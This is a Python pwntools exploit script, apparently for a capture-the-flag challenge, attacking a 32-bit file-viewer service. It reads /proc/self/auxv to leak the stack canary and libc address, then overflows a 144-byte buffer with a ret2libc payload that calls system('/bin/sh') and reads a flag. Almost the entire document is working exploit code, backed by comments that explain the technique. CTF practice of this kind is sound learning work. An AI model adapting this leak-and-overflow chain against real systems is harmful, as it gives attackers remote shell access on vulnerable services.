# The binary has a bug that can be triggered by viewing a file and setting the length to -1.
# Since we can read /proc/self/fd/0 (STDIN), it is possible to write and overflow the buffer (144 bytes).
# However, first download the binary by reading the file /proc/self/exe (the ELF of the current process binary).
# After that, we can run it locally and also examine the code by using objdump -d binary.bin.
# It is not possible to just overflow the buffer and set a new return address because of stack-smashing protection. Stack-smashing protection uses a canary byte (in this case, it is three bytes + 00). The canary byte is placed between the buffer on the stack and the return address - when the function exits, it checks that the canary byte is intact. So, we have to find the canary byte and include it in the payload.
# Get the canary byte from /proc/self/auxv. The AUXV vectors are useful:
# - 25 is AT_RANDOM = canary byte
# - 7 is the address of the LD-library
# - 9 is the entry point in the running binary.
# Calculate the address of libc. The start addresses of ld and libc change between different executions of the program. BUT... It turns out that the distance between the LD-library (linker) and the LIBC is constant. In my case, it's 0x23900 on the remote machine and 0x24000 on my local machine. It is possible to find the distance between libc and ld by running /proc/self/maps.
# Once the canary byte is known and we have the address of libc, a shellcode can be constructed and passed to the remote host.
# Use 'cat flag' to retrieve the flag!

from pwn import *
import subprocess
import time

REMOTE_ADDR = "localhost"
REMOTE_PORT = 5554
LIBC_PATH = '/usr/lib32/libc.so.6'
BIN_PATH = 'exe'          

libc = ELF(LIBC_PATH)

def remote_get_file(path):
    conn = remote(REMOTE_ADDR, REMOTE_PORT)
    conn.sendline('1'.encode())
    print(conn.recv())
    conn.sendline(path)
    print(f"--> {conn.recv()}")
    conn.sendline('-1'.encode())
    data = conn.recvall(timeout=2)

    prefix = b"nr of bytes: "
    if data.startswith(prefix):
        data = data[len(prefix):]

    data = data.split(b"\nEOF {path}")[0]
    
    filename = path.split("/")[-1]

    with open(filename, 'wb') as f:
        f.write(data)

    subprocess.run(["chmod", "+x", filename])

    print("-- binary saved to {filename}")
    f.close()
    conn.close()


def setup_context():
    context.arch = 'i386'
    context.terminal = ['xterm', '-e']
    #context.binary = BIN_PATH
    libc = ELF(LIBC_PATH)

def decode_auxiliary_vectors_32bit(binary_data, ld_libc_offset):

    auxv = []
    offset = 0
    data_length = len(binary_data)
    int_size = 8
    num_ints = len(binary_data) // int_size

    while offset < data_length:
        # Läs ett par av 32-bitars heltal (key, value) från den binära datan
        aux_entry = binary_data[offset:offset+8]

        # Om vi når slutet av datan eller stöter på AT_NULL, sluta läsa
        if len(aux_entry) < 8 or struct.unpack('I', aux_entry[:4])[0] == 0:
            break

        # Packa upp nyckeln och värdet
        key, value = struct.unpack('II', aux_entry)
        auxv.append((key, value))
        offset += 8

    for key, value in auxv:
        #print(f'Key: {key}, {hex(value)}')

        if key == 3:
            at_entry = value & 0xffffff00
            #print(f"Program entry point: {hex(value)}")

        if key == 25:
            #print(f"AT_RANDOM {hex(value)}")
            at_random = value
      
        if key == 33:
            #print(f"AT_SYSINFO {hex(value)}")
            at_sysinfo = value

        if key == 7:
            #print(f"AT_SYSINFO {hex(value)}")
            at_ld = value

    # Calculate ld_addr
             
    ld_addr = at_ld
    libc_addr = ld_addr - ld_libc_offset

    print(f"Found ld-adress: {hex(ld_addr)}")
    print(f"Calculated libc-adress: {hex(libc_addr)}")
    print(f"Found AT_RANDOM (canary byte): {hex(at_random)}")
  
    return at_random, ld_addr, libc_addr, at_entry

def create_payload(canary, libc_addr, ld_addr, pgm_entry):

    p_elf = ELF(context.binary.path)
    libc.address = libc_addr
    # 
    print(f"=== Create payload - libc-addr: {hex(libc.address)}") 
    
    binsh = next(libc.search(b'/bin/sh'))
    system = libc.symbols['system']

    print(f"canary hex: {hex(canary)}")
    print(f"binsh: {hex(binsh)}")
    print(f"system: {hex(system)}")

    # Create payload (canary-byte + /bin/sh + system)
    payload = b'A' * 144                   
    payload += p32(canary)                
    payload += b'B' * 8                   
    payload += p32(0x00000000)             
    payload += p32(system)                 
    payload += p32(0x00000000)             
    payload += p32(binsh)                  

    return payload

def get_canary(mem_data):
    canary = int.from_bytes(mem_data[0:4], byteorder='little')
    masked_canary = canary & 0xffffff00

    block_size = 32
    data_blocks = [mem_data[i:i+block_size] for i in range(0, len(mem_data), block_size)]

    first = 0
    for block in data_blocks:
        hex_str = binascii.hexlify(block).decode('utf-8')
        formatted_hex = ' '.join(['0x' + hex_str[i:i+8] for i in range(0, len(hex_str), 8)])
        print(formatted_hex)
        break;
    return masked_canary

def get_mem_maps(p):
    mappings = p.libs()
    print("Minnesmappningar:")
    for mapping, address in mappings.items():
        print(f"{mapping}: {hex(address)}")
    
    mapp_list = list(p.libs().items())

    print("Base address (lib-c): ")
    print(hex(mapp_list[1][1]))

    libc_base = mapp_list[1][1]
    libc.address = libc_base

def mappings(p, ld_libc_offset):
    print(p.recv())
    p.sendline('1'.encode())
    print(p.recv())
    p.sendline('/proc/self/auxv'.encode())
    auxv_data_raw = p.recv()
    p.sendline('140'.encode())
    auxv_data_raw = p.recv()
    auxv_data = auxv_data_raw.split(b"EOF /proc/self/auxv")[0]

    # Find some useful addresses
    at_random, ld_addr, libc_addr, pgm_entry = decode_auxiliary_vectors_32bit(auxv_data, ld_libc_offset)

    p.sendline('1'.encode())
    print(p.recv())
    p.sendline('/proc/self/maps'.encode())
    auxv_data_raw = p.recv()
    p.sendline('-1'.encode())
    lines = p.recv().decode('utf-8').split("\n")
    for line in lines:
        print(line)

def pwn(p, ld_libc_offset):

    print(p.recv())
    p.sendline('1'.encode())
    print(p.recv())
    p.sendline('/proc/self/auxv'.encode())
    auxv_data_raw = p.recv()
    p.sendline('140'.encode())
    auxv_data_raw = p.recv()
    auxv_data = auxv_data_raw.split(b"EOF /proc/self/auxv")[0]

    # Find some useful addresses 
    at_random, ld_addr, libc_addr, pgm_entry = decode_auxiliary_vectors_32bit(auxv_data, ld_libc_offset)

    # Get the canary byte 
    p.sendline('2'.encode())
    print(p.recv())
    mem_addr = at_random + int(0x00007fff00000000)
    mem_addr_hex = hex(mem_addr)
    print(mem_addr_hex)
    p.sendline(mem_addr_hex.encode())
    mem_data = p.recv().split(b"EOM")[0]

    canary = get_canary(mem_data)

    print(f"canary: {canary}")

    p.sendline('1'.encode())
    print(p.recv())
    p.sendline('/proc/self/fd/0\0x00./flag\0x00'.encode())
    print(p.recv())
    p.sendline('-1'.encode())

    payload = create_payload(canary, libc_addr, ld_addr, pgm_entry)
    #payload = jmp_payload()

    print("Sending payload...") 

    p.sendline(payload)

    print(p.recv())

    p.sendline("cat flag".encode())

    print(p.recv())

    p.close()



def main():
    # Setup 
    setup_context()

    remote_get_file("/proc/self/exe")

    context.binary = BIN_PATH

    print(" === LOCAL RUN === ")
    ld_libc_offset = 0x241000
    p = process(context.binary.path)
    #get_mem_maps(p)
    pwn(p, ld_libc_offset)

    print(" === REMOTE RUN === ")
    ld_libc_offset = 0x239000
    conn = remote(REMOTE_ADDR, REMOTE_PORT)
    pwn(conn, ld_libc_offset)
    
    # First run mappings 
    #mappings(conn, ld_libc_offset)

if __name__ == '__main__':
    main()
